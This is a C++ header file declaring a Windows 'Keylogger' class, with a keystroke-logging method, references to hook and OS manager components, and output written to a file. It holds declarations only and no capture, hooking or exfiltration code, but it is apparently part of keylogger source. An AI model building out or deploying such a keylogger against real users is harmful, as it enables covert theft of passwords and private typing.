#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Windows.h>
#include <sstream>

#include "windows_info.h"
#include "hook_manager.h"
#include "os_manager.h"
#include "key_input.h"

class Keylogger {
public:
    Keylogger(std::ofstream&& outputFile, OSManager& manager, HookManager& hookManager, WindowInfo& windowInfo, KeyInput& keyInput);
    
    int LogKeyStroke(int keyStroke);

private:
    OSManager& _manager;
    HookManager& _hookManager;
    WindowInfo& _windowInfo;
    KeyInput& _keyInput;

    std::ofstream _outputFile;

    void writeToOutput(std::stringstream& output);
};

#endif